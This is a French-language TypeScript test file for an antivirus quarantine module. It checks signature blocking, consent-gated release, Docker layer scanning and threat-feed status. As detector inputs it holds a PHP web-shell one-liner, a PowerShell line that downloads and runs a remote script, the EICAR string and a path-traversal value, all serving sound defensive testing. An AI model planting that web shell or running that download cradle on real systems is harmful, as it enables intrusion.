// Antivirus d'abord, partout : tout ce qui vient de l'extérieur passe par le point commun « quarantaine d'abord »
// (src/valhalla/ullr/garde.ts) AVANT d'être utilisé. Les « virus » d'ici sont des fichiers inoffensifs dont
// l'empreinte SHA-256 est mise dans la base de signatures (un vrai fichier EICAR serait supprimé par l'antivirus du
// poste de développement) ; le texte EICAR n'est utilisé qu'en mémoire.
import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import test from 'node:test';
import { gzipSync } from 'node:zlib';
import { intelOf, passerEnQuarantaine, prochainPassage, historiqueQuarantaine } from '../src/valhalla/modules/ullr.ts';
import { allModules } from '../src/valhalla/odin.ts';
import { Valhalla } from '../src/valhalla/service.ts';
import { Engine } from '../src/valhalla/hringhorni/engine.ts';
import { BASE_RULES, compileGaldr, RuleSet, scanBuffer } from '../src/valhalla/ullr/engine.ts';
import { aBloquer, brancherGarde, Bloque, exigerSain, gardeBranchee, quarantaineDabord } from '../src/valhalla/ullr/garde.ts';
import { parseCvd, SOURCES } from '../src/valhalla/ullr/intel.ts';
import { entry, fakeRegistry, tarOf } from './oci-fixtures.ts';

const sha = (b: Buffer | string) => createHash('sha256').update(b).digest('hex');
const EICAR = 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*';
type Alerte = { level: string; title: string; detail?: string; steps?: string[]; fix?: { action: string } };

function monde(o: { routes?: Array<[RegExp, (url: string) => Response]> } = {}) {
  const home = mkdtempSync(join(tmpdir(), 'odin-avp-')), alertes: Alerte[] = [], routes = o.routes ?? [];
  let maintenant: Date | undefined;
  const v = new Valhalla(home, allModules({ paths: { home, workspace: join(home, 'workspace') }, cfg: { venus: { url: '' }, voice: {} } } as never), {
    run: async () => ({ code: 1, out: '', err: '' }), notify: async () => {}, autonomy: () => 'equilibre',
    fetch: (async (input: string | URL) => { const url = String(input); for (const [re, fn] of routes) if (re.test(url)) return fn(url); return new Response('introuvable', { status: 404 }); }) as unknown as typeof fetch,
  });
  v.events.on('alert', (a: Alerte) => alertes.push(a));
  const ctx = v.ctx('ullr');
  /** Un faux virus : un contenu inoffensif dont l'empreinte entre dans la base de signatures (« EICAR simulé » : un fichier inoffensif signé par son empreinte). */
  const signer = (...contenus: Buffer[]) => { intelOf(ctx).build(contenus.map((c, i) => ({ hashes: [{ sha: sha(c), family: 'Agent-simulé' }], stamp: { id: `essai${i}`, at: new Date().toISOString(), count: 1, licence: 'essai' } }))); };
  return { v, home, alertes, routes, ctx, signer, avancer: (ms: number) => { maintenant = new Date(Date.now() + ms); (ctx as { now: () => Date }).now = () => maintenant!; }, fin: () => { v.stop(); rmSync(home, { recursive: true, force: true }); } };
}
const Q = (w: ReturnType<typeof monde>) => (w.ctx.settings.quarantine as Array<{ id: string; file: string; nom?: string; origine?: string; source?: string; par?: string; pourquoi?: string[]; etat?: string; sha256: string; threat: string }> | undefined) ?? [];

test('règle de blocage (pure) : empreinte connue, règle sûre ou fichier d\'essai → bloqué ; simple indice → non', () => {
  const k = { rules: new RuleSet(BASE_RULES.map(compileGaldr)) };
  assert.equal(aBloquer(scanBuffer('note.txt', Buffer.from('Bonjour'), k)), false);
  assert.equal(aBloquer(scanBuffer('eicar.com', Buffer.from(EICAR), k)), true, 'le fichier d\'essai des antivirus est bloqué à l\'arrivée');
  assert.equal(aBloquer(scanBuffer('shell.php', Buffer.from('<?php eval(base64_decode($_POST["c"])); ?>'), k)), true, 'règle sûre');
  const faux = Buffer.from('contenu inoffensif');
  assert.equal(aBloquer(scanBuffer('a.bin', faux, { ...k, hash: (h) => (h === sha(faux) ? { source: 'essai' } : undefined) })), true, 'empreinte');
  assert.equal(aBloquer(scanBuffer('maj.ps1', Buffer.from('IEX (New-Object Net.WebClient).DownloadString("http://203.0.113.5/a.ps1")'), k)), false, 'un indice seul ne bloque pas');
});

test('sans Asclépios : le gardien de secours analyse quand même (règles de base) et neutralise le fichier', async () => {
  brancherGarde(undefined); assert.equal(gardeBranchee(), false);
  const d = mkdtempSync(join(tmpdir(), 'odin-secours-'));
  try {
    const ok = await quarantaineDabord({ donnees: Buffer.from('rien de spécial'), nom: 'note.txt', origine: 'essai' });
    assert.equal(ok.ok, true); assert.equal(ok.gardien, 'secours'); assert.equal(ok.sha256, sha('rien de spécial'));
    const f = join(d, 'shell.php'); writeFileSync(f, '<?php eval(base64_decode($_POST["c"])); ?>');
    const p = await quarantaineDabord({ fichier: f, origine: 'essai' });
    assert.equal(p.bloque, true); assert.ok(!existsSync(f), 'le fichier n\'est plus utilisable à sa place');
    assert.ok(!readFileSync(`${f}.bloque-odin`).includes('eval('), 'contenu brouillé');
    await assert.rejects(exigerSain({ donnees: Buffer.from(EICAR), nom: 'e.com', origine: 'essai' }), (e: Error) => e instanceof Bloque && /bloqué/.test(e.message));
    await assert.rejects(quarantaineDabord({ origine: 'rien' }), /ni fichier ni contenu/);
  } finally { rmSync(d, { recursive: true, force: true }); }
});

test('un téléchargement infecté finit en quarantaine AVANT tout usage, avec une notification : quoi, pourquoi, ce qui a été fait, quoi faire', async () => {
  const w = monde();
  try {
    await w.v.act('ullr', 'etat'); assert.equal(gardeBranchee(), true, 'Asclépios tient le point de passage commun');
    const virus = Buffer.from(`installateur piégé (simulé) ${Math.random()}`), dest = join(w.home, 'Téléchargements', 'outil-gratuit.exe');
    w.signer(virus);
    // Un contenu téléchargé, pas encore écrit : il n'arrive jamais à sa place.
    const p = await quarantaineDabord({ donnees: virus, nom: 'outil-gratuit.exe', destination: dest, origine: 'Téléchargement d\'Odin', source: 'https://exemple.fr/outil-gratuit.exe', usage: 'l\'installer' });
    assert.equal(p.bloque, true); assert.equal(p.ok, false); assert.equal(p.gardien, 'asclepios'); assert.match(p.par ?? '', /empreinte/); assert.match(p.texte, /🚫 outil-gratuit\.exe est bloqué/);
    assert.ok(!existsSync(dest), 'rien n\'est écrit à la destination');
    const q = Q(w)[0];
    assert.equal(q.id, p.quarantaine); assert.equal(q.origine, 'Téléchargement d\'Odin'); assert.equal(q.source, 'https://exemple.fr/outil-gratuit.exe'); assert.equal(q.sha256, sha(virus)); assert.equal(q.etat, 'attente');
    assert.ok(!readFileSync(join(w.home, 'valhalla', 'ullr', 'quarantaine', q.id)).includes('installateur piégé'), 'gardé brouillé');
    // La notification.
    const a = w.alertes.find((x) => /Asclépios a bloqué outil-gratuit\.exe/.test(x.title))!;
    assert.ok(a, 'notification'); assert.equal(a.level, 'critique');
    assert.match(a.detail!, /Quoi : outil-gratuit\.exe, venu de Téléchargement d'Odin \(https:\/\/exemple\.fr/);
    assert.match(a.detail!, /Pourquoi : Malware connu : Agent-simulé, trouvé par empreinte\. .*son empreinte est dans la base/);
    assert.match(a.detail!, /Ce qui a été fait : mis à l'écart \(n° [a-f0-9]{12}\) AVANT de l'installer ; rien n'a été ouvert, installé ni lancé/);
    assert.match(a.detail!, /« Accepter » .* ou « Refuser » .*Sans réponse dans 2 min, il reste en quarantaine/);
    assert.ok(a.steps!.length >= 3 && a.fix?.action === 'refuser');
    // Consultable dans Asclépios : liste (origine, date, détection, empreinte) et détail du pourquoi.
    const liste = await w.v.act('ullr', 'quarantaine');
    assert.match(liste.text, new RegExp(`${q.id} · Malware connu : Agent-simulé · outil-gratuit\\.exe · Téléchargement d'Odin \\(https://exemple\\.fr/outil-gratuit\\.exe\\) · \\d{4}-\\d\\d-\\d\\d \\d\\d:\\d\\d · trouvé par empreinte · empreinte ${sha(virus).slice(0, 16)}`));
    const det = await w.v.act('ullr', 'detail_quarantaine', { id: q.id });
    assert.match(det.text, /Trouvé par : empreinte[\s\S]*son empreinte est dans la base de essai0[\s\S]*Empreinte SHA-256 : [a-f0-9]{64}[\s\S]*S'il est libéré, il ira : .*outil-gratuit\.exe/);
    const vue = await w.v.module('ullr')!.view(w.ctx, new URLSearchParams());
    assert.deepEqual(vue.onglets, ['Analyser', 'Quarantaine', 'Sources', 'Réglages']);
    const tq = vue.sections.find((s) => s.title === 'Quarantaine') as { rows: Array<{ cells: string[]; actions: Array<{ action: string }> }> };
    assert.match(tq.rows[0].cells.join(' | '), /à décider avant .* \| outil-gratuit\.exe \| Téléchargement d'Odin · https:\/\/exemple\.fr.* \| Malware connu : Agent-simulé \(empreinte\)/);
    assert.deepEqual(tq.rows[0].actions.map((x) => x.action), ['detail_quarantaine', 'accepter', 'refuser', 'reanalyser']);
    // Sans réponse dans le délai : en quarantaine (libérer / bloquer).
    assert.equal(passerEnQuarantaine(w.ctx), 0, 'pas avant le délai');
    w.avancer(3 * 60_000); assert.equal(passerEnQuarantaine(w.ctx), 1); assert.equal(Q(w)[0].etat, 'quarantaine');
    const tq2 = (await w.v.module('ullr')!.view(w.ctx, new URLSearchParams())).sections.find((s) => s.title === 'Quarantaine') as { rows: Array<{ cells: string[]; actions: Array<{ action: string }> }> };
    assert.equal(tq2.rows[0].cells[0], 'en quarantaine'); assert.deepEqual(tq2.rows[0].actions.map((x) => x.action), ['detail_quarantaine', 'liberer', 'bloquer', 'reanalyser']);
    // Réanalyser : toujours dangereux, il reste.
    assert.match((await w.v.act('ullr', 'reanalyser', { id: q.id })).text, /Toujours dangereux : Malware connu : Agent-simulé/);
    // Libérer est grave : jamais par une automatisation ; avec ton accord, le fichier est rangé à sa place.
    const auto = await w.v.act('ullr', 'liberer', { id: q.id }, { auto: true });
    assert.equal(auto.ok, false); assert.match(auto.text, /action grave \(libérer outil-gratuit\.exe \(bloqué pour : Malware connu : Agent-simulé\).*elle demande ton accord/);
    assert.ok(!existsSync(dest) && Q(w).length === 1, 'rien n\'a bougé sans accord');
    const mod = w.v.module('ullr')!, grave = (id: string) => mod.actions.find((x) => x.id === id)!.grave;
    assert.ok(grave('liberer') && grave('accepter') && grave('bloquer') && grave('supprimer'), 'libérer, accepter, bloquer, supprimer : avec ton accord');
    assert.match(grave('bloquer')!({ id: q.id }, w.ctx)!, /SUPPRIMÉ automatiquement et définitivement, sans retour possible/);
    const lib = await w.v.act('ullr', 'liberer', { id: q.id });
    assert.match(lib.text, /libéré : rangé à sa place .*comme si de rien n'était/); assert.deepEqual(readFileSync(dest), virus, 'identique, à son emplacement habituel');
    assert.equal(Q(w).length, 0);
    // Libéré par toi : il n'est plus bloqué dans ton dos.
    const encore = await quarantaineDabord({ fichier: dest, origine: 'Téléchargement d\'Odin' });
    assert.equal(encore.bloque, false); assert.match(encore.texte, /libéré par toi auparavant/); assert.ok(existsSync(dest));
    // Le registre garde tout (il va dans la base ASCLEPIOS_ODIN dès qu'elle est prête).
    assert.deepEqual(historiqueQuarantaine(w.ctx).map((e) => e.quoi).reverse(), ['bloqué', 'mis en quarantaine', 'réanalysé', 'libéré']);
  } finally { w.fin(); }
});

test('accepter ou refuser : refuser supprime définitivement ; bloquer aussi ; un fichier du disque quitte sa place', async () => {
  const w = monde();
  try {
    await w.v.act('ullr', 'etat');
    const a = Buffer.from(`pièce jointe piégée (simulée) ${Math.random()}`), b = Buffer.from(`autre fichier piégé ${Math.random()}`); w.signer(a, b);
    const d = join(w.home, 'workspace', 'inbox'); mkdirSync(d, { recursive: true });
    const fa = join(d, 'facture.pdf.exe'), fb = join(d, 'photo.scr'); writeFileSync(fa, a); writeFileSync(fb, b);
    const pa = await quarantaineDabord({ fichier: fa, origine: 'Pièce jointe (Telegram)', source: 'Awa' });
    assert.equal(pa.bloque, true); assert.ok(!existsSync(fa), 'le fichier a quitté la boîte d\'arrivée');
    // Refuser : supprimé définitivement.
    assert.match((await w.v.act('ullr', 'refuser', { id: pa.quarantaine })).text, /refusé : supprimé définitivement/);
    assert.equal(Q(w).length, 0); assert.ok(!existsSync(join(w.home, 'valhalla', 'ullr', 'quarantaine', pa.quarantaine!)));
    assert.equal((await w.v.act('ullr', 'liberer', { id: pa.quarantaine })).ok, false, 'plus rien à libérer');
    // Accepter (grave) : rangé à sa place.
    const pb = await quarantaineDabord({ fichier: fb, origine: 'Pièce jointe (Telegram)' });
    assert.match((await w.v.act('ullr', 'accepter', { id: pb.quarantaine }, { auto: true })).text, /action grave \(accepter photo\.scr malgré la détection/);
    assert.match((await w.v.act('ullr', 'accepter', { id: pb.quarantaine })).text, /accepté : rangé dans/); assert.deepEqual(readFileSync(fb), b);
    // Bloquer depuis la quarantaine : supprimé.
    const c = Buffer.from(`troisième ${Math.random()}`); w.signer(c);
    const pc = await quarantaineDabord({ donnees: c, nom: 'c.bin', origine: 'essai' });
    assert.match((await w.v.act('ullr', 'bloquer', { id: pc.quarantaine })).text, /bloqué : supprimé définitivement/); assert.equal(Q(w).length, 0);
    // Le délai se règle.
    assert.match((await w.v.act('ullr', 'delai_decision', { secondes: 30 })).text, /30 s/);
    // Par une appli (action) : même point de passage.
    const f2 = join(d, 'encore.exe'); writeFileSync(f2, c);
    const r = await w.v.act('ullr', 'verifier_arrivee', { chemin: f2, origine: 'Nébuleuse · dépôt' });
    assert.equal(r.ok, false); assert.match(r.text, /bloqué par l'antivirus/); assert.ok(!existsSync(f2));
    // Un fichier sain passe, sans bruit.
    const sain = join(d, 'notes.txt'); writeFileSync(sain, 'liste de courses');
    const ps = await quarantaineDabord({ fichier: sain, origine: 'essai' }); assert.equal(ps.ok, true); assert.ok(existsSync(sain));
  } finally { w.fin(); }
});

test('Arche : une image Docker dont une couche est infectée est refusée AVANT d\'être dépaquetée et lancée', async () => {
  const w = monde(), dir = mkdtempSync(join(tmpdir(), 'odin-argo-'));
  const virus = Buffer.from(`programme piégé dans une couche (simulé) ${Math.random()}`);
  const reg = await fakeRegistry([gzipSync(tarOf(entry('opt/', { type: '5' }), entry('opt/notes.txt', { data: 'rien' }))), gzipSync(tarOf(entry('usr/', { type: '5' }), entry('usr/outil', { data: virus, mode: 0o755 })))]);
  try {
    await w.v.act('ullr', 'etat'); w.signer(virus);
    const e = new Engine(dir, { rootless: true }), etapes: string[] = [];
    await assert.rejects(e.pull(`127.0.0.1:${reg.port}/odin/boite:1`, (t) => etapes.push(t)), (x: Error) => x instanceof Bloque && /image 127\.0\.0\.1:\d+\/odin\/boite:1 refusée par l'antivirus : la couche 2\/2 contient Malware connu : Agent-simulé .*Rien n'a été dépaqueté ni lancé/.test(x.message));
    assert.ok(etapes.includes('Analyser l\'image (antivirus)') && !etapes.includes('Dépaqueter l\'image') && !etapes.includes('Image prête'));
    assert.equal(e.images().length, 0, 'aucune image enregistrée : rien à lancer');
    assert.ok(!existsSync(join(dir, 'images')) || !e.findImage(`127.0.0.1:${reg.port}/odin/boite:1`));
    const q = Q(w)[0]; assert.match(q.origine!, /Arche · image Docker/); assert.match(q.source!, /odin\/boite:1/); assert.match(q.nom!, /couche 2\/2/);
    assert.ok(w.alertes.some((a) => /Asclépios a bloqué couche 2\/2/.test(a.title) && /AVANT de lancer un conteneur/.test(a.detail ?? '')));
    await assert.rejects(e.run({ image: `127.0.0.1:${reg.port}/odin/boite:1`, name: 'boite' }), /refusée par l'antivirus|introuvable|couche/, 'lancer l\'image la retire de nouveau, et la refuse de nouveau');
  } finally { reg.srv.close(); w.fin(); rmSync(dir, { recursive: true, force: true }); }
});

test('sources des signatures : d\'où elles viennent, dernière et prochaine mise à jour, nombre, failles récentes, alerte si une source échoue', async () => {
  const jour = new Date().toISOString().slice(0, 10);
  const w = monde({ routes: [
    [/openphish\/public_feed/, () => new Response('https://faux-paypal.mechant-exemple.org/login\n')],
    [/known_exploited_vulnerabilities\.json/, () => Response.json({ vulnerabilities: [{ cveID: 'CVE-2026-4242', vendorProject: 'Exemple', product: 'Serveur', vulnerabilityName: 'Exécution de code à distance', dateAdded: jour, knownRansomwareCampaignUse: 'Known' }, { cveID: 'CVE-2025-0001', vendorProject: 'Autre', product: 'Outil', vulnerabilityName: 'Ancienne faille', dateAdded: '2025-01-02', knownRansomwareCampaignUse: 'Unknown' }] })],
    [/stalkerware-indicators/, () => new Response('erreur du site', { status: 503 })],
  ] });
  const cle = process.env.ABUSE_CH_KEY; delete process.env.ABUSE_CH_KEY;
  try {
    // Ce qui est branché : ClamAV officiel (à activer), abuse.ch, YARA, CISA KEV.
    for (const id of ['clamav-daily', 'malwarebazaar', 'threatfox', 'urlhaus', 'signature-base', 'yara-forge', 'cisa-kev', 'openphish']) assert.ok(SOURCES.find((s) => s.id === id)?.fetch, id);
    const up = await w.v.act('ullr', 'mettre_a_jour');
    assert.match(up.text, /✓ OpenPhish \(flux public\) : 1 hameçonnage/); assert.match(up.text, /✓ CISA KEV : 2 failles/); assert.match(up.text, /✗ Stalkerware Indicators : .*503/); assert.match(up.text, /○ MalwareBazaar : clé absente/);
    // Une source qui échoue : alerte claire, avec quoi faire.
    const al = w.alertes.find((a) => /la source Stalkerware Indicators a échoué/.test(a.title))!;
    assert.ok(al); assert.match(al.detail!, /Quoi : .*Pourquoi : .*503.*Ce qui a été fait : les signatures déjà en service restent actives/); assert.equal(al.fix?.action, 'mettre_a_jour');
    const r = await w.v.act('ullr', 'etat_sources');
    const d = r.data as { sources: Array<{ id: string; etat: string; derniere?: string; prochaine?: string; nombre?: number; erreur?: string; echecs: number; mode: string }>; failles: Array<{ cve: string }> };
    const s = (id: string) => d.sources.find((x) => x.id === id)!;
    assert.equal(s('cisa-kev').etat, 'ok'); assert.equal(s('cisa-kev').nombre, 2); assert.ok(Date.parse(s('cisa-kev').derniere!) > Date.now() - 60_000);
    assert.ok(Math.abs(Date.parse(s('cisa-kev').prochaine!) - (Date.now() + 24 * 3600_000)) < 120_000, 'prochaine : dans 24 h (son rythme)');
    assert.equal(s('stalkerware').etat, 'échec'); assert.match(s('stalkerware').erreur!, /503/); assert.equal(s('stalkerware').echecs, 1);
    assert.equal(s('malwarebazaar').etat, 'clé absente'); assert.equal(s('clamav-daily').etat, 'désactivée'); assert.equal(d.sources.some((x) => x.id === 'virustotal'), false, 'VirusTotal retiré'); assert.equal(s('malwarebazaar-api').etat, 'à la demande'); assert.equal(s('clamav').etat, 'référence');
    assert.deepEqual(d.failles.map((f) => f.cve), ['CVE-2026-4242', 'CVE-2025-0001'], 'les plus récentes d\'abord');
    assert.match(r.text, /CISA KEV : ok · 2 failles · dernière .* · prochaine /); assert.match(r.text, /Failles récemment déclarées \(CISA KEV\) :\n- .* · CVE-2026-4242 · Exemple Serveur : Exécution de code à distance \(rançongiciels\)/);
    // La page : l'onglet Sources (tableau des sources, failles récentes, bouton de mise à jour).
    const vue = await w.v.module('ullr')!.view(w.ctx, new URLSearchParams());
    const ts = vue.sections.find((x) => x.title === 'Sources des signatures') as { columns: string[]; rows: Array<{ cells: string[]; actions?: Array<{ action: string }> }> };
    assert.deepEqual(ts.columns, ['Source', 'Apporte', 'Dernière', 'Prochaine', 'Nombre', 'État', 'Licence et conditions']);
    assert.match(ts.rows.find((x) => x.cells[0] === 'Stalkerware Indicators')!.cells[5], /✗ échec \(1×\) : .*503/);
    assert.deepEqual(ts.rows.find((x) => x.cells[0] === 'CISA KEV')!.actions!.map((x) => x.action), ['mettre_a_jour', 'source']);
    assert.ok(vue.sections.some((x) => x.title?.startsWith('Failles récemment déclarées')) && vue.sections.some((x) => x.title === 'Mises à jour automatiques'));
    // Mises à jour automatiques : chaque source à son rythme (une source à jour n'est pas redemandée avant son heure).
    assert.equal(prochainPassage(undefined, 6, new Date('2026-11-15T10:00:00Z')).toISOString(), '2026-11-15T10:00:00.000Z', 'jamais faite : tout de suite');
    assert.equal(prochainPassage('2026-11-15T08:00:00Z', 6, new Date('2026-11-15T10:00:00Z')).toISOString(), '2026-11-15T14:00:00.000Z');
    // Deuxième échec de suite : compté.
    await w.v.act('ullr', 'mettre_a_jour', { source: 'stalkerware' });
    assert.equal(((await w.v.act('ullr', 'etat_sources')).data as typeof d).sources.find((x) => x.id === 'stalkerware')!.echecs, 2);
  } finally { if (cle) process.env.ABUSE_CH_KEY = cle; w.fin(); }
});

test('ClamAV : le fichier officiel (.cvd) est lu sans ClamAV (empreintes SHA-256 seulement)', () => {
  const hsb = `${'a'.repeat(64)}:1024:Win.Trojan.Essai-1\n${'b'.repeat(40)}:10:Sha1.Ignoree\n${'c'.repeat(64)}:*:Unix.Malware.Essai-2\n`;
  const cvd = Buffer.concat([Buffer.from('ClamAV-VDB:15 Nov 2026 10-00 +0000:27800:2:90:x:y:essai:1'.padEnd(512, ' ')), gzipSync(tarOf(entry('daily.info', { data: 'x' }), entry('daily.hsb', { data: hsb }), entry('daily.hdb', { data: `${'d'.repeat(32)}:5:Md5.Ignoree\n` })))]);
  assert.deepEqual(parseCvd(cvd), [{ sha: 'a'.repeat(64), family: 'Win.Trojan.Essai-1' }, { sha: 'c'.repeat(64), family: 'Unix.Malware.Essai-2' }]);
  assert.throws(() => parseCvd(Buffer.from('pas un cvd')), /pas un fichier de signatures ClamAV/);
});

test('les autres portes d\'entrée passent par le même point : pièce jointe d\'une messagerie, téléchargement envoyé par Pégase', async () => {
  const w = monde();
  try {
    await w.v.act('ullr', 'etat');
    const virus = Buffer.from(`pièce jointe piégée par messagerie (simulée) ${Math.random()}`), sain = Buffer.from('photo de vacances'); w.signer(virus);
    const inbox = join(w.home, 'workspace', 'inbox');
    // Messageries (Discord, Signal… : dépôt commun) : jamais écrite dans la boîte d'arrivée.
    const { dropFile } = await import('../src/bifrost/channel.ts');
    const r = await dropFile(inbox, 'devis.pdf.exe', 'application/octet-stream', virus);
    assert.match(r, /Pièce jointe bloquée par l'antivirus : devis\.pdf\.exe \(Malware connu : Agent-simulé\)/);
    assert.deepEqual(existsSync(inbox) ? (await import('node:fs')).readdirSync(inbox) : [], [], 'rien dans la boîte d\'arrivée');
    assert.match(await dropFile(inbox, 'photo.jpg', 'image/jpeg', sain), /\[Fichier reçu : inbox\/.*photo\.jpg/);
    assert.ok(Q(w).some((q) => q.nom === 'devis.pdf.exe' && q.origine === 'Pièce jointe reçue par messagerie'));
    // Pégase : le fichier qu'il envoie à Odin pour avis passe par le même point (gardé en quarantaine, consultable).
    const { analyserFichier } = await import('../src/valhalla/modules/pegase.ts');
    const a = await analyserFichier(w.v.ctx('pegase'), 'installateur.exe', Buffer.from(EICAR));
    assert.equal(a.verdict, 'bloque');
    assert.ok(Q(w).some((q) => q.nom === 'installateur.exe' && q.origine === 'Pégase · téléchargement'), 'visible dans la quarantaine d\'Asclépios');
    assert.equal((await analyserFichier(w.v.ctx('pegase'), 'notes.txt', Buffer.from('rien'))).verdict, 'sain');
  } finally { w.fin(); }
});

test('envoi en morceaux reprenables : chaque morceau s\'ajoute, un décalage faux dit où reprendre', async () => {
  const { Readable } = await import('node:stream');
  const { recevoirMorceau, fichierEnvoi } = await import('../src/web/morceaux.ts');
  const d = mkdtempSync(join(tmpdir(), 'odin-morceaux-')), envoi = 'ab'.repeat(12), req = (b: Buffer) => Readable.from([b]) as never;
  try {
    assert.deepEqual(await recevoirMorceau(req(Buffer.from('AAAA')), d, envoi, 0), { ok: true, recu: 4 });
    assert.deepEqual(await recevoirMorceau(req(Buffer.from('BBBB')), d, envoi, 4), { ok: true, recu: 8 });
    // Coupure, puis reprise au mauvais endroit : rien n'est écrit, la réponse dit où reprendre.
    const faux = await recevoirMorceau(req(Buffer.from('XXXX')), d, envoi, 2);
    assert.equal(faux.ok, false); assert.equal(faux.recu, 8); assert.match(faux.error!, /reprise : 8 octet\(s\) déjà reçus/);
    assert.deepEqual(await recevoirMorceau(req(Buffer.from('CC')), d, envoi, 8), { ok: true, recu: 10 });
    assert.equal(readFileSync(fichierEnvoi(d, envoi)!, 'utf8'), 'AAAABBBBCC');
    assert.equal((await recevoirMorceau(req(Buffer.from('x')), d, '../../etc', 0)).ok, false, 'identifiant d\'envoi contrôlé');
    assert.equal((await recevoirMorceau(req(Buffer.from('trop')), d, envoi, 10, 12)).ok, false, 'taille maximale tenue');
  } finally { rmSync(d, { recursive: true, force: true }); }
});
